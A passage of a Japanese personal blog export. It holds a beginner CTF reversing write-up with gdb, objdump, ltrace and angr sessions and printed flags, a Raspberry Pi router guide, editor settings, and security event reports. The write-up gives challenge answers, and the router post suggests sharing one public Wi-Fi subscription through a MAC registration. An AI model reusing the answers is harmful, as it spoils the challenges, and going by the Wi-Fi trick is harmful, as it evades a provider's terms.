0x0804844f <+57>: nop\n   0x08048450 <+58>: mov    eax,0x0\n   0x08048455 <+63>: leave\n   0x08048456 <+64>: ret\nEnd of assembler dump.\n(gdb) b*0x0804844e\nBreakpoint 1 at 0x804844e\n(gdb) r\nStarting program: /media/sf_share/bin200_1\n\nBreakpoint 1, 0x0804844e in main ()\n(gdb) i r\neax            0xffffffe5\t-27\necx            0xd4024da0\t-738046560\nedx            0xffffffe8\t-24\nebx            0x0\t0\nesp            0xffffdc18\t0xffffdc18\nebp            0xffffdc28\t0xffffdc28\nesi            0x1\t1\nedi            0xf7fc6000\t-134455296\neip            0x804844e\t0x804844e <main+56>\neflags         0x296\t[ PF AF SF IF ]\ncs             0x23\t35\nss             0x2b\t43\nds             0x2b\t43\nes             0x2b\t43\nfs             0x0\t0\ngs             0x63\t99\n```\n\n## Not Print FLAG (Reversing 200)\n\n渡されたバイナリを動かすと\n`Sorry. I forgot to display the FLAG. This message is not FLAG.`\nって言われて終わります。\n\n（strippedなのでつらいのですが＞＜）バイナリをよく読んでみると、\nなんだか怪しいことをしてる部分が見つかります。（↑を表示するちょっと手前の部分です）\n```x86asm\n 8048471:   c7 45 f0 00 00 00 00    mov    DWORD PTR [ebp-0x10],0x0\n 8048478:   eb 11                   jmp    804848b <putchar@plt+0x13b>\n 804847a:   8b 45 f0                mov    eax,DWORD PTR [ebp-0x10]\n 804847d:   8b 04 85 40 a0 04 08    mov    eax,DWORD PTR [eax*4+0x804a040]\n 8048484:   89 45 f4                mov    DWORD PTR [ebp-0xc],eax\n 8048487:   83 45 f0 01             add    DWORD PTR [ebp-0x10],0x1\n 804848b:   8b 45 f0                mov    eax,DWORD PTR [ebp-0x10]\n 804848e:   83 f8 19                cmp    eax,0x19\n 8048491:   76 e7                   jbe    804847a <putchar@plt+0x12a>\n```\n\nどこかから何かを読んで`ebp-0xc`へ格納していますが、読み出した値は使ってませんね。\nあー！_forgot to display_ってそういうことか！\n\nで、読み出し元の`0x804a040`というのは.dataセクションなので、ココを見ると……\n```sh\n# objdump -s -j.data ./bin200_2\n\n./bin200_2:     file format elf32-i386\n\nContents of section .data:\n 804a020 00000000 00000000 00000000 00000000  ................\n 804a030 00000000 00000000 00000000 00000000  ................\n 804a040 31000000 6e000000 37000000 5f000000  1...n...7..._...\n 804a050 76000000 34000000 6c000000 75000000  v...4...l...u...\n 804a060 33000000 5f000000 33000000 71000000  3..._...3...q...\n 804a070 75000000 34000000 6c000000 5f000000  u...4...l..._...\n 804a080 63000000 68000000 34000000 72000000  c...h...4...r...\n 804a090 34000000 63000000 37000000 33000000  4...c...7...3...\n 804a0a0 72000000 00000000                    r.......\n```\n\nそれっぽいのが見つかりました。\n\n## Encrypted FLAG (Reversing 300)\n\nFLAGを入力するとそれが正解かどうかを判定してくれるバイナリです。\n\n.dataセクションになにやらそれっぽい`flag`っていう変数があります。\n\n```\n(gdb) x/s 0x804a02c\n0x804a02c <flag>:\t\"\\226\\201\\223\\301\\227\\216\\215\\232\\207\\252\\215\\232\\207\\252\\206\\234\\230\\205\\231\\220\\252\\226\\207\\214\\205\\201\\324\\324\\210\\365\"\n```\n\nどうやら暗号化されているようで、そのままでは読めないです。\n\nバイナリを読んでみると、`flag`を`decrypt`という関数で変換して、そのデータをstrcmpで入力と比較しています。\n\n実際にflagを変換している部分がココ\n```x86asm\n 8048558:   83 c4 10                add    esp,0x10\n 804855b:   83 ec 04                sub    esp,0x4\n 804855e:   6a 42                   push   0x42\n 8048560:   6a 1e                   push   0x1e\n 8048562:   68 2c a0 04 08          push   0x804a02c\n 8048567:   e8 73 00 00 00          call   80485df <decrypt>\n 804856c:   83 c4 10                add    esp,0x10\n 804856f:   83 ec 04                sub    esp,0x4\n 8048572:   6a b7                   push   0xffffffb7\n 8048574:   6a 1e                   push   0x1e\n 8048576:   68 2c a0 04 08          push   0x804a02c\n 804857b:   e8 5f 00 00 00          call   80485df <decrypt>\n```\n\n講義でやった関数呼び出しの話を思い出すと、\nどうやら`decrypt`に`flag`のアドレス、何らかの値①、何らかの値②を順番に渡しています。\n\n`0x804a02c`がflagのアドレスなので、C言語っぽく書いてみると、\n```c\ndecrypt(flag, 0x1e, 0x42);\ndecrypt(flag, 0x1e, 0xffffffb7);\n```\nこの0x1e、`strlen(flag) == 0x1e`なので、どうやらflagの長さっぽいですね。\n\nで、`decrypt`が何をしているかというと、\n\n```x86asm\n080485df <decrypt>:\n 80485df:   55                      push   ebp\n 80485e0:   89 e5                   mov    ebp,esp\n 80485e2:   83 ec 14                sub    esp,0x14\n 80485e5:   8b 45 10                mov    eax,DWORD PTR [ebp+0x10]\n 80485e8:   88 45 ec                mov    BYTE PTR [ebp-0x14],al\n 80485eb:   c7 45 fc 00 00 00 00    mov    DWORD PTR [ebp-0x4],0x0\n 80485f2:   eb 1c                   jmp    8048610 <decrypt+0x31>\n 80485f4:   8b 55 fc                mov    edx,DWORD PTR [ebp-0x4]\n 80485f7:   8b 45 08                mov    eax,DWORD PTR [ebp+0x8]\n 80485fa:   01 c2                   add    edx,eax\n 80485fc:   8b 4d fc                mov    ecx,DWORD PTR [ebp-0x4]\n 80485ff:   8b 45 08                mov    eax,DWORD PTR [ebp+0x8]\n 8048602:   01 c8                   add    eax,ecx\n 8048604:   0f b6 00                movzx  eax,BYTE PTR [eax]\n 8048607:   32 45 ec                xor    al,BYTE PTR [ebp-0x14]\n 804860a:   88 02                   mov    BYTE PTR [edx],al\n 804860c:   83 45 fc 01             add    DWORD PTR [ebp-0x4],0x1\n 8048610:   8b 45 fc                mov    eax,DWORD PTR [ebp-0x4]\n 8048613:   3b 45 0c                cmp    eax,DWORD PTR [ebp+0xc]\n 8048616:   7c dc                   jl     80485f4 <decrypt+0x15>\n 8048618:   90                      nop\n 8048619:   c9                      leave\n 804861a:   c3                      ret\n```\n\nこうなので、C言語っぽく書くとこうでしょうか？\n```c\nvoid decrypt(char* flag, int len, int num){\n\tfor(int i = 0; i < len; i++){\n\t\tflag[i] ^= num;\n\t}\n}\n```\n\nじゃあ、`flag`を実際に復号してみます。\n```c\n#include <stdio.h>\n\nchar flag[] = \"\\226\\201\\223\\301\\227\\216\\215\\232\\207\\252\\215\\232\\207\\252\\206\\234\\230\\205\\231\\220\\252\\226\\207\\214\\205\\201\\324\\324\\210\\365\";\n\nvoid decrypt(char* flag, int len, int num){\n   for(int i = 0; i < len; i++){\n      flag[i] ^= num;\n   }\n}\n\nint main(){\n   decrypt(flag, 0x1e, 0x42);\n   decrypt(flag, 0x1e, 0xffffffb7);\n   puts(flag);\n   return 0;\n}\n```\n\nイケました！\n\n### ラクをする\n\nstrcmpで比較するために、実行中にメモリにFLAGが乗っているはずなので、gdbで探してみます。\nstrcmpの直前でブレークして`flag`を見てみると、\n\n```sh\n# gdb -q ./bin300\nReading symbols from ./bin300...(no debugging symbols found)...done.\n(gdb) b*0x0804858f\nBreakpoint 1 at 0x804858f\n(gdb) x/s 0x0804a02c\n0x804a02c <flag>: \"ctf4b{xor_xor_simple_crypt!!}\"\n```\n\n### もっとラクをする\n\n`ltrace`っていう便利なモノがあります。\nコレを使うと、ライブラリ関数の呼び出しをトレースできます。\nつまり、strcmpに何を渡しているのかが見えます。\n\n```sh\n# ltrace ./bin300\n__libc_start_main(0x804851b, 1, 0xff932834, 0x8048620 <unfinished ...>\nprintf(\"Please input flag... \")                                      = 21\n__isoc99_scanf(0x80486b6, 0xff93273c, 0xff932740, 0x80482a9)         = 0xffffffff\nstrcmp(\"\\024\", \"ctf4b{xor_xor_simple_crypt!!}\")                      = -1\nputs(\"Wrong flag...\")                                                = 14\n+++ exited (status 0) +++\n```\n\n### おまけ\n\nangrを使ってみる\n\n```python\n# python2\n>>> import angr\n>>> p = angr.Project(\"./bin300\", load_options={\"auto_load_libs\":False})\n>>> state = p.factory.blank_state(addr=0x804851b)\n>>> path = p.factory.path(state)\n>>> pg = p.factory.path_group(path)\n>>> e = pg.explore(find=0x80485a7, avoid=0x80485b9)\n>>> e.found[0].state.posix.dumps(0)\n'ctf4b{xor_xor_simple_crypt!!}\\x00\\xd9\\xd9\\xd9\\xd9\\xd9\\xd9\\xd9\\xd9\\xd9\\xd9\\xd9\\xd9\\xd9\\xd9\\xd9\\xd9\\xd9\\xd9\\xd9\\xd9\\xd9\\xd9\\xd9\\xd9\\xd9\\xd9\\xd9\\xd9\\xd9\\xd9\\xd9\\xd9\\xd9\\xd9\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n```\n","title":"CTF for ビギナーズ 2016 金沢 に行った (writeup)","image":null,"tags":["参加記","CTF","CTF4b"],"date":"2016-11-27T00:00:00.000Z","updated":"2021-01-07T13:52:12.000Z"},{"type":"article","slug":"12","body":"作ります\n\n## イーサネットコンバータ\n\n無線LANの電波を有線に変換するやつ（適当）\n\n公衆無線LANをイーサネットコンバータで有線ネットワークにつなげると嬉しいね、みたいな。\nてかこれルータじゃないか？\n\n## 準備\n\n突然ですがArchLinuxは神です。\nとりあえずRaspiにArchLinuxARMを入れます。\n\nx86_64の一般的なやつと比べるとインスコ難易度は低めです。\n\nここのInstallationをみましょう\n\nhttps://archlinuxarm.org/platforms/armv8/broadcom/raspberry-pi-3\n\nなんかmacOSでやろうとしたら詰んだので、Linux上でやることをオススメします。\nボクはArchLinux(x86_64) on VirtualBox on macOSでやったんですが、非常に闇だったのでおすすめしません。\nWindowsは知りません。ガンバッテ。\n\nちなみにx86_64版のインストールはこの記事がわかりやすいですね！！１１\n\nhttps://trap.jp/post/39/\n\n## 設定\n\n### IPを固定しよう\n\n先にLAN側をやりましょう。\n\n今回は`10.0.0.0/24`なネットワークを作ってみます。\nArchLinuxは神なので[netctl](https://wiki.archlinuxjp.org/index.php/Netctl)っていう神ツールが入っています。\n\nこの設定ファイル`/etc/netctl/eth0`を書いて、\n```\nInterface=eth0\nConnection=ethernet\nIP=static\nAddress=('10.0.0.1/24')\n```\n\n```sh\n# netctl start eth0\n# netctl enable eth0\n```\n\nこんなかんじ。\n自分のIPアドレスは`10.0.0.1`にしました。\n\n### DHCP/DNSサーバになろう\n\n市販のルーターにはだいたいついてるDHCP/DNS機能ですが、**dnsmasq**ってのがありまして、この人がこの2つを兼任してくれます。\n\nとりあえずインストール\n```sh\n# pacman -S dnsmasq\n```\n\nで、設定ファイル`/etc/dnsmasq.conf`に追記します。\n```\ninterface=eth0\nbind-interfaces\ndhcp-range=10.0.0.2,10.0.0.254,2h\ndhcp-option=option:netmask,255.255.255.0\ndhcp-option=option:router,10.0.0.1\ndhcp-option=option:dns-server,10.0.0.1\n```\n\nそしたらdnsmasqを起動します。\n```sh\n# systemctl start dnsmasq\n# systemctl enable dnsmasq\n```\n\nこれで、このRaspiがデフォルトゲートウェイと化したので、他の人がRaspiにガンガンパケットを送ってくるようになります。\nでもルーティングしてないから死ぬね。\n\n\n### インターネットに繋ごう\n\nそしたらWAN側をなんとかします。\nLAN側にeth0を向けてて、WAN側にはwlan0を使います。\n\nArchLinuxは神なので、**wifi-menu**っていう神ツールがはいってます。（たぶんnetctlの一部）\n\n```sh\n# wifi-menu -o\n```\n\nってやったら後はウィザード形式で設定できてしまいます。\n簡単！！！説明することがない！！\n\n再起動しても自動でつながるようにしておきます。\n```sh\n# netctl list\n* eth0\n* wlan0-Wi2_club\n  wlan0-TokyoTech\n\n# netctl enable wlan0-Wi2_club\n```\n\n今回は公衆無線LANのWi2に繋いでいます。\nnetctlを使えば場所によって手軽にプロファイルを切り替えられる！！便利だ！！！！\n\n### ルーティングしよう\n\nじゃあ、色んな所から届いてるパケットをうまく捌きましょう。\n\nまず、パケット転送を有効にします。\n```sh\n# sysctl net.ipv4.ip_forward=1\n```\n\n再起動後も有効になるように`/etc/sysctl.d/ipforward.conf`を作成します。\n```\nnet.ipv4.ip_forward=1\n```\n\nあとは**iptables**さんが優秀なので、例によって設定を書くだけです。\n\n`/etc/iptables/iptables.rules`を作成します。\n```\n*filter\n:INPUT ACCEPT [231:17979]\n:FORWARD ACCEPT [0:0]\n:OUTPUT ACCEPT [150:14976]\n-A FORWARD -i eth0 -o wlan0 -j ACCEPT\n-A FORWARD -m state --state RELATED,ESTABLISHED -j ACCEPT\nCOMMIT\n\n*nat\n:PREROUTING ACCEPT [10:734]\n:INPUT ACCEPT [4:314]\n:OUTPUT ACCEPT [2:134]\n:POSTROUTING ACCEPT [0:0]\n-A PREROUTING -d 10.0.0.1 -i eth0 -j ACCEPT\n-A POSTROUTING -s 10.0.0.0/24 -o wlan0 -j MASQUERADE\nCOMMIT\n```\n\n自分宛てのパケットは受け取って、それ以外はNAPT(IPマスカレード)でうまいこと書き換えて流します。\n\niptablesの設定を有効化します。\n```sh\n# systemctl start iptables\n# systemctl enable iptables\n```\n\n## できあがり！\n\n完成です。\nイーサネットコンバータもといルータと化したRaspberry Pi 3です。\n\nwlan0のMACアドレスをWi2とかの公衆無線LANに登録すれば、無制限に分配できるマンになれます。\n\neth0が100Mbpsまでしか通れないので、ちょっと大きいことをしようとするとかなり辛いです。\nギガビット対応のUSB接続LANアダプタつけたらちょっとだけ速くなります。\nでもUSB2.0なので最大転送速度は理論値480Mbpsくらいが限界です。かなしい。\n","title":"Raspberry Pi 3 で作るイーサネットコンバータというかルータ","image":null,"tags":["ネットワーク","Raspberry Pi"],"date":"2016-10-16T00:00:00.000Z","updated":"2021-01-07T09:09:45.000Z"},{"type":"article","slug":"11","body":"はい。\n\nOSXでマトモに使えるエディタが他にないですよね。\n\n- CotEditor\n  - 痒いところに手が届かない\n- mi\n  - なんか微妙\n- Atom, VSCode, Brackets\n  - 重い(でもElectronは神だよ)\n- その他無名エディタ\n  - 論外\n\n# Sublime Text\n\n買って使おう。\n\n## Package Control\n\nhttps://packagecontrol.io/installation\n\n必須\n取り敢えず入れよう\n\n## IMESupport\n\nhttps://packagecontrol.io/packages/IMESupport\n\n> IMESupportは、Windows の Sublime Text で IME を利用した文字入力をサポートするパッケージです。\n> IME でインライン変換の入力文字が正しい位置に表示されない問題をある程度解決できます。\n\nWinでは入れないとお話にならない。\n\n## OSX + GoogleJapaneseInput の問題\n\nGoogle日本語入力使ってると起こるのかな？？\n（ことえりがクソなので試してすら無いけど）\n\nこの問題が唯一にして最大の欠点。。。\n\n### 検索パネルでEnterが効かない問題\n\n次検索をsuper+enterで行うようにして回避した。\n\n```js\n/* 640行目付近 */\n\n// Find panel key bindings\n{ \"keys\": /* FIX: */ [\"super+enter\"], \"command\": \"find_next\", \"context\":\n\t[{\"key\": \"panel\", \"operand\": \"find\"}, {\"key\": \"panel_has_focus\"}]\n},\n\n...\n\n// Replace panel key bindings\n{ \"keys\": /* FIX: */ [\"super+enter\"], \"command\": \"find_next\", \"context\":\n\t[{\"key\": \"panel\", \"operand\": \"replace\"}, {\"key\": \"panel_has_focus\"}]\n},\n\n...\n\n// Incremental find panel key bindings\n{ \"keys\": /* FIX: */ [\"super+enter\"], \"command\": \"hide_panel\", \"context\":\n\t[{\"key\": \"panel\", \"operand\": \"incremental_find\"}, {\"key\": \"panel_has_focus\"}]\n},\n```\n\n### ファンクションキーでの変換ができない問題\n\nデフォルトで割り当てられている機能を無効化する\n\n```js\n/* 240行目付近 */\n\n/* FIX:\n{ \"keys\": [\"f7\"], \"command\": \"build\" },\n*/\n```\n\n### tabで変換候補が選択できない問題\n\ntabにデフォルトで割り当てられている機能を無効化する\n\n```js\n/* 100行目付近 */\n\n/* FIX:\n{ \"keys\": [\"tab\"], \"command\": \"insert_best_completion\", \"args\": {\"default\": \"\\t\", \"exact\": true} },\n{ \"keys\": [\"tab\"], \"command\": \"insert_best_completion\", \"args\": {\"default\": \"\\t\", \"exact\": false},\n\t\"context\":\n\t[\n\t\t{ \"key\": \"setting.tab_completion\", \"operator\": \"equal\", \"operand\": true },\n\t\t{ \"key\": \"preceding_text\", \"operator\": \"not_regex_match\", \"operand\": \".*\\\\b[0-9]+$\", \"match_all\": true },\n\t]\n},\n*/\n```\n\n参考\nhttp://qiita.com/akippiko/items/1382faa29833379621f6\n\n\n## テーマ\n\n### Piatto\n\nhttps://packagecontrol.io/packages/Theme%20-%20Piatto\n\nver2.0.0以降からグレー基調になってしまった。（微妙）\n使うならver1系が良い。白基調できれい。\n合わせるカラースキームはDawnがオススメ。\n\n### Boxy Theme\n\nhttps://packagecontrol.io/packages/Boxy%20Theme\n\n神\n\nBoxy Yesterdayがカッコいいです。\n\n![](1.png)\n\nボクが使ってる設定\n\n```js\n{\n\t\"color_scheme\": \"Packages/Boxy Theme/schemes/Boxy Yesterday.tmTheme\",\n\t\"font_size\": 14,\n\t\"highlight_line\": true,\n\t\"line_padding_bottom\": 2,\n\t\"line_padding_top\": 2,\n\t\"shift_tab_unindent\": true,\n\t\"theme\": \"Boxy Yesterday.sublime-theme\",\n\t\"theme_accent_green\": true,\n\t\"theme_autocomplete_item_selected_colored\": true,\n\t\"theme_bar\": true,\n\t\"theme_bar_colored\": true,\n\t\"theme_scrollbar_rounded\": true,\n\t\"theme_sidebar_disclosure\": true,\n\t\"theme_sidebar_indent_top_level_disabled\": true,\n\t\"theme_statusbar_colored\": true,\n\t\"theme_statusbar_size_xs\": true,\n\t\"trim_automatic_white_space\": false,\n\t\"word_wrap\": false\n}\n```\n\n## キーマップ\n\n### OSX\n\n一行切り取り/コピーがけっこう暴発するので無効化したり、\nコード整形を出来るようにしたり、置換パネルをWinライクに出せるようにしたり。\n\n```js\n[{\n\t\"keys\": [\"ctrl+tab\"],\n\t\"command\": \"reindent\",\n\t\"context\": [{\n\t\t\"key\": \"text\",\n\t\t\"operator\": \"regex_contains\",\n\t\t\"operand\": \"\\n\"\n\t}]\n}, {\n\t\"keys\": [\"super+h\"],\n\t\"command\": \"show_panel\",\n\t\"args\": {\n\t\t\"panel\": \"replace\",\n\t\t\"reverse\": false\n\t}\n}, {\n\t\"keys\": [\"super+c\"],\n\t\"command\": \"noop\"\n}, {\n\t\"keys\": [\"super+c\"],\n\t\"command\": \"copy\",\n\t\"context\": [{\n\t\t\"key\": \"selection_empty\",\n\t\t\"operator\": \"equal\",\n\t\t\"operand\": false\n\t}]\n}, {\n\t\"keys\": [\"super+x\"],\n\t\"command\": \"noop\"\n}, {\n\t\"keys\": [\"super+x\"],\n\t\"command\": \"cut\",\n\t\"context\": [{\n\t\t\"key\": \"selection_empty\",\n\t\t\"operator\": \"equal\",\n\t\t\"operand\": false\n\t}]\n}]\n```\n\n\n## Win\n\n```js\n[{\n\t\"keys\": [\"ctrl+tab\"],\n\t\"command\": \"reindent\",\n\t\"context\": [{\n\t\t\"key\": \"text\",\n\t\t\"operator\": \"regex_contains\",\n\t\t\"operand\": \"\\n\"\n\t}]\n}, {\n\t\"keys\": [\"ctrl+c\"],\n\t\"command\": \"noop\"\n}, {\n\t\"keys\": [\"ctrl+c\"],\n\t\"command\": \"copy\",\n\t\"context\": [{\n\t\t\"key\": \"selection_empty\",\n\t\t\"operator\": \"equal\",\n\t\t\"operand\": false\n\t}]\n}, {\n\t\"keys\": [\"ctrl+x\"],\n\t\"command\": \"noop\"\n}, {\n\t\"keys\": [\"ctrl+x\"],\n\t\"command\": \"cut\",\n\t\"context\": [{\n\t\t\"key\": \"selection_empty\",\n\t\t\"operator\": \"equal\",\n\t\t\"operand\": false\n\t}]\n}]\n```\n","title":"神エディタSublimeText3","image":null,"tags":["SublimeText","エディタ"],"date":"2016-09-16T00:00:00.000Z","updated":"2021-01-07T09:09:45.000Z"},{"type":"external","url":"https://trap.jp/post/78/","publisher":"東京工業大学デジタル創作同好会traP","title":"TWCTF 2016 writeup","tags":["traP","CTF","セキュリティ","参加記"],"date":"2016-09-06T00:00:00.000Z"},{"type":"article","slug":"10","body":"行きました。\n\n# SANS Netwars とは\n\n米国SANSの強い講師の方による強い講義を受けて、\n翌日CTFでさっそく学んだことを活かそう！！！みたいなイベントです。\n\nタダでハイクオリティな講義が受けられてしかもいろいろグッズが貰える！！！神か！！！\n\n## 講義\n\n英語なのでツラみがある。\nでも同時通訳がついてるので安心！日本語で質問もできるよ！！\n\n詳しい内容を書いてしまうとめっちゃ怒られてしまうので、とても良かったよ、とだけ。\n\n## 懇親感\n\n1日目の夜には懇親会があります。\n食事がスゴイ豪華な上にお酒まで飲めます。NRI Secureの財力を感じる……！\n\nボクは交流そっちのけでタダ飯を食って、人に心配されるレベルまでタダ酒を飲んでました（クズ）\n\n## CTF\n\nCTFがやりたくて参加したみたいなところがある。\nこれも詳細を喋ると消されるので、楽しかったよ、とだけ。\n\nスコアボードが常にスクリーンに映しだされてて、順位の入れ替えがビュンビュン表示されててめっちゃカッコいいです。\nFLAGをsubmitして、自分の順位がグーンって上がるのを見るのがめちゃめちゃ楽しいです。\n\n最終結果\n\nhttps://twitter.com/TimMedin/status/766901031003299841\n\nボクは2位でした。\n\nhttps://twitter.com/sekai67/status/766905677621047296\n\n# 楽しかった！！！！\n\nNRI SecureとSANSは神\n\nみんな参加しよう！！！\n","title":"SANS Netwars 2016に行った","image":null,"tags":["参加記","SANS Netwars","CTF","セキュリティ"],"date":"2016-08-22T00:00:00.000Z","updated":"2021-01-07T13:52:12.000Z"},{"type":"article","slug":"9","body":"行ってきました。\nセキュリティキャンプに応募した話もあります↓\n\n[セキュリティキャンプに応募した話](/posts/3/)\n\nなんか微妙に日が空いてしまったので最初の方とかもう空覚えなんですが、思い出しながら。\n\n# 一日目\n\n海浜幕張から5分位歩いてクロスウェーブ幕張に到着。\nなんかTwitterみてるとクソ早くに到着して付近散策してらっしゃる参加者さんもいましたが、\nまぁ普通に定刻に付けば大丈夫そう。\n\n![](1.jpg)\n\n会場入りしたら名刺交換タイムでした。\n強そうな人たちから次々と「名刺交換して頂けませんか」と声をかけられます＞＜\n\nhttps://twitter.com/security_camp/status/762848234498699264\n\nで、お昼を食べたり開講式でありがたいお言葉を頂いたりして、講義です。\n\n## セキュリティ基礎\n\nいきなりグループディスカッションです。自己紹介をしつつ、「セキュリティ・キャンプ応募フォームの問題点」を考えました。\n\nhttps://twitter.com/security_camp/status/762909216008867840\n\n## 特別講演「ZENIGATAになりたくて」\n\nめっちゃ面白かったです。\nCyberDefenceとICPOはなんで協力関係にあるのか？みたいな話から、\nICPOのサイバー部門の仕事について、そして「技術」とは何かみたいなお話。\nなんかこのお話を聞けただけでもキャンプに来た甲斐があった気がします。\n\n「CTFでBinaryができる人は大抵Webもできるが、逆はない」とおっしゃられていたのが刺さりました＞＜\n精進します。。。\n\nhttps://twitter.com/security_camp/status/762912661927407616\n\n## 特別講演「サイバー犯罪の実態とこれに対処するための取組」\n\nサイバー犯罪に対する警察の取組みについて。\nこういう分野に関して警察が何やってるのかって、なかなか表に出てこないので、目からウロコでした。\nあと間仁田さんの話し方が面白いです。\n\nhttps://twitter.com/security_camp/status/762928020537483264\n\n# 2日目\n\nいよいよ専門講座！\n\n## [1,2-E] TLS徹底演習\n\nTLSとは何か、TLSは何故必要なのか、といったお話から始まりました。\n**徹底**演習の名の如く、これ以上ないくらい詳しく解説して頂きました。\n\nで、TLSのハンドシェイクはどんな物なのかを一つ一つ見ながら、簡単な演習を行いました。\nペアになって手でTLSのハンドシェイクを作ってメッセージ交換したり、\n間に人を挟んで人力MITM攻撃をしてみたり、楽しかったです。\n\nこの講義は集中講義なので丸一日を使うのですが、\n午後に入った段階で漸く「TLSを理解する**準備**」に入るので、ちょっとビビりました。\nTLSは多くの要素技術を組み合わせてやっと成り立つものらしいので、徹底的に解説するには時間がかかるのも納得です。\n\n理解する準備が終わったら、実際にNode.jsで最新の暗号方式ChaCha20-Poly1305の実装を行いました。\nコレ、つい2ヶ月前に仕様化が完了したばかりの本当に最先端の技術なので、こんな講義を受けられる場所はここしかない！そうです。\n\n大津先生は「どうせ誰も演習を最後まで終えられないだろう」と仰っていましたが、\nボクはNode.jsがスキなので楽しくサクサク演習を進めて、あと1題(!)で終わるトコロまできたのですが、残念ながらタイムアップ。\n大津先生は何故か安堵されていました(笑)\n\nhttps://twitter.com/security_camp/status/763175036786049025\n\n講義の資料は先生がWebにアップしてくださっていますので、以下から見れます。\n\n[こちら](https://speakerdeck.com/shigeki/tlsche-di-yan-xi)\n\n## CTF\n\n待ちに待ったCTF！\nセキュリティに興味を持ったきっかけがCTFなので、もうコレが一番の楽しみでした。\n\nhttps://twitter.com/sekai67/status/763312140350480384\n\nボクらE4gleJumpもガンバるよ！\n\n19:00からの予定でしたが、機材トラブルで30分ほど遅れてのスタート。\nこういうイベントでは（特にネットワーク関係の）機材トラブルがあるあるですね。\n\nhttps://twitter.com/security_camp/status/763325426198466560\n\nこのCTF、「はいコレ、RaspberryPiで動いてるサーバね」ってIPアドレス渡されて放り出されます。\nなんか、この時点でもうだいぶ困惑してるチームもあったようです。\n\n幸いボクらのチームにはRaspiのプロ👏がいたので、\n彼が開始即ポートスキャンでSSHが空いてることを突き止め、\nRaspiのデフォルトユーザとパスワードで一瞬にしてFLAG入手キメててビビりました。\n（SSHでログインできないと次に進めないので、けっこうツラかったですね。）\n\nボクはまぁ、例によってWeb問をチマチマいじってました。\nベーシックなXSSと、PHPのプロトコルラッパーを悪用する問題を解きました。\n後で聞いたところ、どこかに任意コード実行の脆弱性が仕込まれてたようなんですが、全く分からず詰み。\n\nボクがWebで無駄に足掻いてる最中にも、チームのプロ👏各位によってPPCとかCryptoがバシバシ解かれて……\n\nhttps://twitter.com/security_camp/status/763353399806955525\n\n講師チームを除けば**1位**でした。\n（途中までは真に1位だったのに……あと1問解けば……ちょっと悔しいです）\n\nhttps://twitter.com/sekai67/status/763362094003609600\n\n賞状をいただきした。\n副賞としてNTTデータさんからQuoカードも頂きました。\n\nhttps://twitter.com/security_camp/status/763520642503151616\n\n# 3日目\n\n## [3-A] Webアプリケーションの脆弱性の評価と発見\n\n脆弱性を探すときにどんなトコロに注目すべきかを教えていただき、\nその後サイボウズオフィスの旧バージョンから実際に脆弱性を探してみるなどしました。\n見つけた脆弱性の評価方法なども、大変ためになりました。\n\nhttps://twitter.com/security_camp/status/763533821081899008\n\n## [4-C] オンラインゲーム アタック＆ディフェンスチャレンジ\n\n運営チームとプレイヤーチームに分かれて、運営はチート対策、プレイヤーはRMTをガンバる競技です。\n2試合あったのですが、事前アンケートでNodeそこそこ触ってますって回答したせいか1回目も2回目も運営でした。\n\nマップ上に湧くカエルを捕まえて経験値を稼いでレベルを上げるっていうシンプルなオンラインゲームです。\nレベルを上げてRMTするとプレイヤーの得点になります、ゲームを安定運用すると運営の得点になります。\n\n1回目はゲームに予め仕込まれていたバグの修正が遅れて、プレイヤーにやりたい放題されてしまいました。（かなしい）\n大差をつけられてしまったので、2回戦に向けて自動BANスクリプトを書くなどしていました。\n\n2回目、満を持して自動BANスクリプトを投入したのですが、どうも不調でRMTの疑いのないアカウントまでBANしてしまい大幅減点を食らう。（ごめんさない）\n仕方がないので、プレイヤーの自動化スクリプトを阻止すべく全ての動作に1秒の遅延を入れてレベルアップ効率を大幅に下げる作戦に出ました。\nコレが功を奏してRMTは減速、見かけ上安定した運営がなされて結果勝てたんですけど、プレイヤーからめっちゃ叩かれました。\n（現実のオンラインゲームでも運営はしばしばプレイヤーに叩かれてますよね……）\n\nチームで協力して問題を対処していく感じがとても楽しかったですね！\n\nhttps://twitter.com/security_camp/status/763629287173873664\n\n## [5-A] サーバ運用におけるパスワード管理\n\nディスカッションが主でした。\n大学のサークルが所有するサーバを管理したりしてるので、いろいろ勉強になりました。\nディスカッションって苦手なのですけど、自分が思いもしなかったような見方があったりして、いろいろ発見があります。\n\nhttps://twitter.com/security_camp/status/763690313210736640\n\n# 4日目\n\n## [6,7-E] インフラセキュリティブートキャンプ\n\nTerraformを使ってAWS上にシステムを構築してみる演習です。\nAWSはEC2とS2くらいしか使ったことがなかったんですが、VPCを使ったりELBを使ったり……途中めちゃめちゃ詰まりましたがなんとか構築できました。\nTerraformはJSONでシステムの構成を記述してコマンド一発で構築しちゃおうってノリのソフトなんですが、（使いこなせれば）めっちゃ強いなと思いました。\n\nコレも集中講義なんですが、午後はちょっと趣向を変えてDockerでいろんなOSSを走らせてみたりだとか、\nAWS Lambdaを使ってサーバレスアーキテクチャを体験してみたりだとか。\n\n手を動かす部分が多くて楽しかったです。\n\nhttps://twitter.com/security_camp/status/763927629346906112\n\n## グループワークの準備\n\n**闇 of 